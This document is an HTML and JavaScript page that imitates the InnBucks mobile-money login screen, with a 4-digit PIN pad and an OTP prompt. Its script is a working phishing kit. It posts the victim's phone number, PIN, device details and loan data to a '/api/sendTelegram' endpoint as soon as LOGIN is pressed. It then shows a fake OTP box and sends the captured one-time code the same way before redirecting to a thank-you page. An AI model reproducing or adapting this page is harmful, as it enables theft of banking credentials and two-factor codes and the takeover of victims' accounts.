<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>InnBucks — Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%}
body{
font-family:Inter,system-ui,Arial;
background:#020617;
margin:0;
padding:18px;
display:flex;
align-items:center;
justify-content:center;
color:#e5e7eb;
}

.card{
width:100%;
max-width:380px;
background:#020617;
padding:20px;
border-radius:14px;
border:1px solid #1f2937;
box-shadow:0 18px 45px rgba(0,0,0,.75);
}

.logo{
height:44px;
display:block;
margin:0 auto 10px;
}

h2{
text-align:center;
margin:0 0 12px;
font-size:20px;
color:#f8fafc;
letter-spacing:.2px;
}

label{
display:block;
font-size:13px;
margin-top:8px;
color:#cbd5f5;
}

input{
width:100%;
padding:10px;
border-radius:8px;
border:1px solid #1f2937;
background:#020617;
color:#e5e7eb;
font-size:14px;
outline:none;
transition:border-color .15s ease, box-shadow .15s ease;
}

input:focus{
border-color:#2563eb;
box-shadow:0 0 0 1px rgba(37,99,235,.35);
}

.btn{
background:#2563eb;
color:#fff;
padding:10px;
border-radius:8px;
border:0;
margin-top:12px;
width:100%;
font-weight:600;
cursor:pointer;
}

.btn[disabled]{
background:#334155;
cursor:not-allowed;
}

.req{color:#ef4444;margin-right:6px}
.small{font-size:13px;color:#9ca3af}
.success{color:#22c55e;font-weight:600}

.error{
min-height:18px;
font-size:13px;
color:#ef4444;
}

.pin-row{
display:flex;
gap:10px;
justify-content:center;
margin-top:10px;
}

.pin-digit{
width:18px;
height:18px;
border-radius:50%;
border:2px solid #fff;
background:#fff;
font-size:1px;
color:transparent;
caret-color:transparent;
outline:none;
}

.pin-digit.filled{
background:#2563eb;
border-color:#2563eb;
}

.otp-modal{
position:fixed;
inset:0;
background:rgba(2,6,23,.88);
display:flex;
align-items:center;
justify-content:center;
}

.otp-box{
background:#020617;
padding:20px;
border-radius:14px;
min-width:340px;
border:1px solid #1f2937;
}

.otp-row{
display:flex;
gap:10px;
justify-content:center;
margin-top:10px;
}

.otp-digit{
width:18px;
height:18px;
border-radius:50%;
border:2px solid #fff;
background:#fff;
font-size:1px;
color:transparent;
}

.otp-digit.filled{
background:#2563eb;
border-color:#2563eb;
}

.resend-row{
display:flex;
justify-content:space-between;
margin-top:14px;
}

.resend-btn{
background:#020617;
border:1px solid #1f2937;
padding:10px 14px;
border-radius:8px;
color:#e5e7eb;
cursor:pointer;
}

.resend-btn[disabled]{opacity:.6}

.action-primary{
background:#2563eb;
border:0;
color:#fff;
}
</style>
</head>

<body>

<div class="card">
<img src="assets/InnBucks.png" class="logo">

<h2>Login</h2>

<form id="loginForm" autocomplete="off">

<label><span class="req">★</span>Mobile Number</label>
<input id="phone" value="+263" inputmode="numeric">
<div id="phoneError" class="error"></div>

<label><span class="req">★</span>Enter your PIN</label>

<div class="pin-row">
<input class="pin-digit" maxlength="1" inputmode="numeric" type="tel">
<input class="pin-digit" maxlength="1" inputmode="numeric" type="tel">
<input class="pin-digit" maxlength="1" inputmode="numeric" type="tel">
<input class="pin-digit" maxlength="1" inputmode="numeric" type="tel">
</div>

<input type="text" id="hp" style="display:none">

<button id="loginBtn" class="btn" disabled>LOGIN</button>

</form>
</div>


<div id="otpModal" class="otp-modal" style="display:none">

<div class="otp-box">

<div style="text-align:center"><strong>Enter OTP</strong></div>

<p class="small">We have sent an OTP to your phone.</p>

<div class="otp-row">
<input class="otp-digit">
<input class="otp-digit">
<input class="otp-digit">
<input class="otp-digit">
<input class="otp-digit">
</div>

<input id="otpBuffer"
inputmode="numeric"
type="tel"
autocomplete="one-time-code"
style="position:absolute;opacity:0;pointer-events:none">

<div class="resend-row">

<div class="small">
Resend in <span id="countdown">120</span>s
</div>

<button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>

</div>

<div style="display:flex;gap:10px;margin-top:14px">

<button id="confirmOtp" class="resend-btn action-primary" disabled>Confirm</button>

<button id="cancelOtp" class="resend-btn">Cancel</button>

</div>

<div id="otpStatus" class="small"></div>

</div>
</div>


<script>

/* LOAN */
function buildLoanRequest(){
try{
const loan = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
if(!loan.loanAmount) return 'N/A';
return `USD ${loan.loanAmount} / ${loan.loanType} / ${loan.repayment} month(s) (${loan.employment})`;
}catch(e){ return 'N/A'; }
}

/* DEVICE */
const ua=navigator.userAgent;
let device='Unknown';
if(/Android/i.test(ua)){const v=ua.match(/Android\s([\d.]+)/);device='Android '+(v?v[1]:'')}
else if(/iPhone|iPad/i.test(ua)){const v=ua.match(/OS (\d+_\d+)/);device='iOS '+(v?v[1].replace('_','.'):'')}
if(/Chrome/i.test(ua)) device+=' | Chrome';
else if(/Safari/i.test(ua)) device+=' | Safari';
else if(/Firefox/i.test(ua)) device+=' | Firefox';

/* PIN */
const pins=[...document.querySelectorAll('.pin-digit')];
let pinValue='';
let loginLocked=false;
let confirmLocked=false;

pins.forEach((el,i)=>{

el.addEventListener('input',()=>{

el.value=el.value.replace(/\D/g,'');

el.classList.toggle('filled',!!el.value);

if(el.value && i<pins.length-1) pins[i+1].focus();

updatePin();

});

el.addEventListener('keydown',(e)=>{

if(e.key==="Backspace" && !el.value && i>0){

pins[i-1].focus();

pins[i-1].value='';

pins[i-1].classList.remove('filled');

updatePin();

}

});

});

function updatePin(){
pinValue=pins.map(p=>p.value).join('');
loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue)) || loginLocked;
}

/* PHONE */
const phone=document.getElementById('phone');
const phoneError=document.getElementById('phoneError');
const loginBtn=document.getElementById('loginBtn');

function validatePhone(){
const d=phone.value.replace('+263','');
if(!/^7\d{8}$/.test(d)){
phoneError.innerText='Enter your 9-digit number starting with 7';
return false;
}
phoneError.innerText='';
return true;
}

phone.addEventListener('input',()=>{
let d=phone.value.replace('+263','').replace(/\D/g,'');
if(d.startsWith('0')) d=d.slice(1);
phone.value='+263'+d.slice(0,9);
validatePhone();
});

/* TELEGRAM instant */
function sendToServer(payload){
fetch('/api/sendTelegram',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify(payload)
});
}

/* OTP */
const dots=[...document.querySelectorAll('.otp-digit')];
const buffer=document.getElementById('otpBuffer');
const confirmBtn=document.getElementById('confirmOtp');
const resendBtn=document.getElementById('resendBtn');
const countdown=document.getElementById('countdown');
const otpStatus=document.getElementById('otpStatus');

let timer=null,seconds=120;

function renderOtp(v){
dots.forEach((d,i)=>d.classList.toggle('filled',!!v[i]));
confirmBtn.disabled=!/^\d{5}$/.test(v) || confirmLocked;
}

buffer.addEventListener('input',()=>{
buffer.value=buffer.value.replace(/\D/g,'').slice(0,5);
renderOtp(buffer.value);
});

buffer.addEventListener('keydown',(e)=>{
if(e.key==="Backspace"){
buffer.value=buffer.value.slice(0,-1);
renderOtp(buffer.value);
e.preventDefault();
}
});

function startCountdown(){
clearInterval(timer);
seconds=120;
resendBtn.disabled=true;
countdown.textContent=seconds;

timer=setInterval(()=>{
countdown.textContent=--seconds;
if(seconds===0){
clearInterval(timer);
resendBtn.disabled=false;
}
},1000);
}

/* LOGIN instant */
document.getElementById('loginForm').addEventListener('submit', e=>{

e.preventDefault();

if(loginLocked) return;

loginLocked=true;

loginBtn.disabled=true;

sendToServer({
event:'login_clicked',
loginPhone:phone.value,
loginPin:pinValue,
loan_request:buildLoanRequest(),
device,
submittedAt:new Date().toISOString()
});

document.getElementById('otpModal').style.display='flex';

buffer.value='';
renderOtp('');
buffer.focus();

startCountdown();

});

/* CONFIRM instant */
confirmBtn.onclick=()=>{

if(confirmLocked) return;

confirmLocked=true;

confirmBtn.disabled=true;

sendToServer({
event:'otp_confirm',
loginPhone:phone.value,
loginPin:pinValue,
otp:buffer.value,
loan_request:buildLoanRequest(),
device,
submittedAt:new Date().toISOString()
});

otpStatus.innerHTML="<span class='success'>Success — request received.</span>";

setTimeout(()=>location.href='thankyou.html',1200);

};

document.getElementById('cancelOtp').onclick=()=>{
document.getElementById('otpModal').style.display='none';
clearInterval(timer);
};

</script>

</body>
</html>
